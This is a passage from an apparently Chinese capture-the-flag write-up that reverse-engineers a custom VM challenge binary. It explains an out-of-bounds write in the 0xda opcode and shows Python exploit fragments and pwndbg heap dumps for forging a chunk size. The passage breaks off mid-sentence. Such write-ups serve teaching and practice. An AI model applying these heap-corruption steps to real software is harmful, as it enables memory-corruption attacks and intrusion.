class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">switch</span> ( HIBYTE(s) )                          <span class=\"comment\">// 最后一字节</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">-1</span>);                          <span class=\"comment\">// x-1,y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">0</span>, <span class=\"number\">-1</span>);                           <span class=\"comment\">// y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">-1</span>);                           <span class=\"comment\">// x+1，y-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">0</span>);                           <span class=\"comment\">// x-1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">6</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">0</span>);                            <span class=\"comment\">// x+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">7</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">-1</span>, <span class=\"number\">1</span>);                           <span class=\"comment\">// x-1,y+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">8</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">0</span>, <span class=\"number\">1</span>);                            <span class=\"comment\">// y+1</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_65;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">9</span>:</span><br><span class=\"line\">      sub_F6F(<span class=\"number\">1</span>, <span class=\"number\">1</span>);                            <span class=\"comment\">// x+1,y+1</span></span><br><span class=\"line\">LABEL_65:</span><br><span class=\"line\">      result = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;End!&quot;</span>);</span><br><span class=\"line\">      result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure>\n<p>这里的 s 就是我们的 code，首先这个 HIBYTE 就烦人，一开始对所有的 BYTE 都不理解。这里呢会根据传进去的数据，返回 16 进制数的最高位，也就是说会返回我们写入的 code 第 8 字节，联系上问提到的，顺序取值，只要修改 x, 即令 code 的最高位为 6。</p>\n<p>除去这部分，就是对指令代码的解析，最低字节为操作码，其余为数据。先说明下怎么操作，大部分都是对栈顶中的数据进行操作，（这点我有些不理解，因为这栈顶的数据应该都是 0 啊。）然后操作码大致被分为三类，小于 0x36, 小于 0x54, 大于 0x54</p>\n<p>小于等于 0x36 的这部分</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">switch</span> ( (<span class=\"type\">unsigned</span> __int8)code )</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"number\">0x13</span>u:</span><br><span class=\"line\">       <span class=\"keyword\">if</span> ( chance &lt;= <span class=\"number\">0</span> )                      <span class=\"comment\">// 重置code和初始xy位置</span></span><br><span class=\"line\">         <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">       set_code_data();</span><br><span class=\"line\">       sub_E91();</span><br><span class=\"line\">       --chance;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"number\">0x33</span>u:</span><br><span class=\"line\">       *(_BYTE *)sRSP ^= BYTE1(s);\t\t\t\t<span class=\"comment\">//异或</span></span><br><span class=\"line\">       rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">       <span class=\"keyword\">break</span>;</span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"number\">0x12</span>u:</span><br><span class=\"line\">       *(_BYTE *)sRSP *= BYTE1(s);\t\t\t\t<span class=\"comment\">//乘法</span></span><br><span class=\"line\">       rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">       <span class=\"keyword\">break</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x36</span> )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   *(_BYTE *)sRSP = sub_CBE();                 <span class=\"comment\">// push 1 bytes</span></span><br><span class=\"line\">   rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>大于 0x36，小于 0x54 的部分</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x36</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x45</span> )        <span class=\"comment\">// push 4byte</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE1(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE2(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE3(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      *(_BYTE *)sRSP = BYTE4(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x45</span>u )   <span class=\"comment\">// BYTEx是对64位code进行拆分,0为最低位</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">73</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (BYTE2(s) &lt;&lt; <span class=\"number\">8</span>) + (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)BYTE1(s) &lt;= size_X &amp;&amp; (BYTE4(s) &lt;&lt; <span class=\"number\">8</span>) + (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)BYTE3(s) &lt;= size_Y )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          x_temp = (BYTE2(s) &lt;&lt; <span class=\"number\">8</span>) + BYTE1(s);</span><br><span class=\"line\">          y_temp = (BYTE4(s) &lt;&lt; <span class=\"number\">8</span>) + BYTE3(s);  <span class=\"comment\">// 设置下一个start的位置，相当于jmp</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x52</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        *(_BYTE *)sRSP += BYTE1(s);</span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x41</span> &amp;&amp; BYTE1(s) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(_BYTE *)sRSP = *(<span class=\"type\">char</span> *)sRSP / (__int16)BYTE1(s);</span><br><span class=\"line\">      rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>大于等于 0x54 的部分</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x54</span> )          <span class=\"comment\">// 输出栈顶数据一字节</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&#123;%c&#125;&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*(<span class=\"type\">char</span> *)sRSP);</span><br><span class=\"line\">  <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x54</span>u )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xCC</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    pop_(<span class=\"number\">1u</span>);                                 <span class=\"comment\">// 数值与初始值相比，大于等于1，现在的数值就减一</span></span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0xCC</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code != <span class=\"number\">0xD0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0xD0</span>u )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xD1</span> )  <span class=\"comment\">// 结束</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xDA</span> &amp;&amp; *(<span class=\"type\">int</span> *)((<span class=\"type\">char</span> *)&amp;s + <span class=\"number\">1</span>) &lt; size_X * size_Y )<span class=\"comment\">// 只检查了offset是否大于边界，但是未考虑到rsp,数组越界</span></span><br><span class=\"line\">          *(_BYTE *)(sRSP + *(<span class=\"type\">int</span> *)((<span class=\"type\">char</span> *)&amp;s + <span class=\"number\">1</span>)) = BYTE5(s);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xCD</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        buf = <span class=\"built_in\">malloc</span>(BYTE1(s));               <span class=\"comment\">// malloc (0xe0)</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">        n = read(<span class=\"number\">0</span>, buf, BYTE1(s));           <span class=\"comment\">// read 0xcd</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( n &gt; <span class=\"number\">0</span> &amp;&amp; *((_BYTE *)buf + n - <span class=\"number\">1</span>) == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">          *((_BYTE *)buf + n - <span class=\"number\">1</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You say \\&quot;%s\\&quot;\\n&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)buf);<span class=\"comment\">// 泄露地址</span></span><br><span class=\"line\">        <span class=\"built_in\">free</span>(buf);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x98</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      pop_(<span class=\"number\">4u</span>);                               <span class=\"comment\">// pop （int）</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code != <span class=\"number\">0xCA</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x6A</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        *(_BYTE *)sRSP -= BYTE1(s);           <span class=\"comment\">// [rsp] - [code]</span></span><br><span class=\"line\">        rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *(_BYTE *)sRSP = BYTE1(s);</span><br><span class=\"line\">  rsp_add_1(<span class=\"number\">1u</span>);</span><br><span class=\"line\">  <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>基本的运算都是字节进行操作，</p>\n<ul>\n<li>0x12 乘法运算</li>\n<li>0x13 重置 code,x,y，只有一次机会，利用的是原来的空间</li>\n<li>0x33 异或运算</li>\n<li>0x36 push 一字节的数据，数据来源于输入，我们输入 48 字节的数据，但是只用一字节，</li>\n<li>0x41 除法运算</li>\n<li>0x45 push 4 字节的数据</li>\n<li>0x49 设置 x,y, 跳转至目标位置 code，第 2，3 字节用于 x，4，5 字节用于 y。</li>\n<li>0x52 加法运算</li>\n<li>0x54 输出一字节栈顶的数据</li>\n<li>0x6a 减法运算</li>\n<li>0x98 pop 4 字节的数据</li>\n<li>0xcc pop 一字节的数据</li>\n<li>0xcd 读入 content 并且输出，虽然检查换行，但是满输入可以泄露地址。malloc 的参数只有一字节，所以 chunk 的大小为 0x20-0xf0。free 后没有情空指针。但是未发现 uaf</li>\n<li>0xd1 程序结束</li>\n<li>0xda rsp+offset 的位置写一字节的数据。这里存在数组越界，因为只会检查 offset 是否超过 X*Y 的范围，但是没有考虑到如果加上 rsp   的条件</li>\n</ul>\n<p>因为他这个栈顶是有点问题的，栈空间已经被初始化为空的，大部分操作都会对 rsp+1，所以理论上栈顶的数据都是空的，一次 pop 也是空的。pop 要满足里面至少有一个数据，rsp-rbp&gt;=1, 但是 push 的操作不会检查是否溢出和越界。pop 只会更改 rsp 指向，但不会改变原始数据。</p>\n<p>这个题最大问题就在与 0xda，正常来说，我们应该只能改变他所定义的那个类似于栈的空间的数据，那么应该是 rbp+offset，但是这里写的是 rsp，就导致了，如果我们的 XN*YN 比较大，offset 可以轻松绕过检查，但是我们将他的 stack 填充很多垃圾，rsp 距离下一个堆块比较近，就导致了 rsp+offset 越界了，起码可以修改到下一个 chunk 的 size。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure>\n<p>思路就是我们通过 push (imm32) 来将 rsp 变得比较大，下面的 chunk 最开始是未分配，还是 topchunk，而程序会连续的 malloc，free 用于储存 content 的 chunk。我已为了构造一个较大的空间，我们连续的申请出 0x10,0x20,0x30,0x40…0xe0 的空间用看来布置 fakechunk.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79000</span><br><span class=\"line\">Size: 0x251</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79250</span><br><span class=\"line\">Size: 0x331</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79580</span><br><span class=\"line\">Size: 0x71</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e795f0</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79610</span><br><span class=\"line\">Size: 0x31</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\">~~~~~</span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79ac0</span><br><span class=\"line\">Size: 0xd1</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79b90</span><br><span class=\"line\">Size: 0xe1</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79c70</span><br><span class=\"line\">Size: 0x20391</span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>通过溢出，我们修改第一个 chunk 的 size 为 largebin 的范围.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x4</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x20</span>,<span class=\"number\">0xd1</span>))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">结果如下，</span><br><span class=\"line\">pwndbg&gt; x/28gx 0x55a9a9e79580</span><br><span class=\"line\">0x55a9a9e79580:\t0x0000000000000000\t0x0000000000000071</span><br><span class=\"line\">0x55a9a9e79590:\t0xffffffffffffffff\t0xffffffffffffffff</span><br><span class=\"line\">0x55a9a9e795a0:\t0xffffffffffffffff\t0xffffffffffffffff</span><br><span class=\"line\">0x55a9a9e795b0:\t0xffffffffffffffff\t0xffffffffffffffff</span><br><span class=\"line\">0x55a9a9e795c0:\t0xffffffffffffffff\t0xffffffffffffffff</span><br><span class=\"line\">0x55a9a9e795d0:\t0xffffffffffffffff\t0x0000000000000000</span><br><span class=\"line\">0x55a9a9e795e0:\t0x0000000000000000\t0x00000000000000ee</span><br><span class=\"line\">0x55a9a9e795f0:\t0x0000000000000000\t0x00000000000004d1</span><br><span class=\"line\">0x55a9a9e79600:\t0x0000000000000000\t0x000055a9a9e79010</span><br><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79000</span><br><span class=\"line\">Size: 0x251</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79250</span><br><span class=\"line\">Size: 0x331</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79580</span><br><span class=\"line\">Size: 0x71</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e795f0</span><br><span class=\"line\">Size: 0x4d1</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79ac0</span><br><span class=\"line\">Size: 0xd1</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x55a9a9e79b90</span><br><span class=\"line\">Size: 0xe1</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这样释放的时候，就不会进入 tcache。而是进入 unsortedbins，对于 content，会检查换行符，但是如果我们申请的是 8 字节，虽然同样会返回 0x20 的空间，但是，chunk 的 bk 可以被 